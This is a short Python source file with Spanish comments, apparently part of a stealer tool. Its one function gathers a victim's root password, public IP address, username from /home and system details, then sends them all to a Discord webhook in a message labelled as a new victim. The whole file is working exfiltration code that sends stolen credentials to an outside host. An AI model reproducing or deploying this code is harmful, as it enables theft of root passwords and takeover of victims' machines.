from os import listdir
from discord_webhook import DiscordEmbed, DiscordWebhook
from requests import get
from platform import uname

def user_info(root_pswd, 
        webhook):

     
#    Método user_info
#
#    Args:
#         root_pswd (str): La contraseña root del usuario, necesaria para el webhook para mandar el mensaje
#         webhook (str): La url del webhook
#
     
#    Se conecta al webhook
     webhook = DiscordWebhook(url=webhook)
     
#    Consigue la IP
     r = get(r'http://jsonip.com')
     ip= r.json()['ip']
     
#    Lista todos los directorios que hay en home,
#    Los cuales tienen el nombre del usuario en 
#    cuestión
     usr = listdir('/home/')[0]
     
#    Consigue información variada del sistema
     systeminfo = uname()
     
#    Prepara el string con toda la información
     stringInfo = f'''
     **User: ** {usr}
     **Ip adress:** {ip}
     **Root password: ** {root_pswd}
     **Información del sistema: **
     {systeminfo}
     '''
     
#    Prepara un embed con toda la información recojida
     embed = DiscordEmbed(title=f'__Usuario víctima nuevo__({usr})',
                              description=stringInfo,
                              color='03b2f8')
     
#    Agrega el embed al webhook
     webhook.add_embed(embed)
     
#    El webhook envía el mensaje con la información
     response = webhook.execute()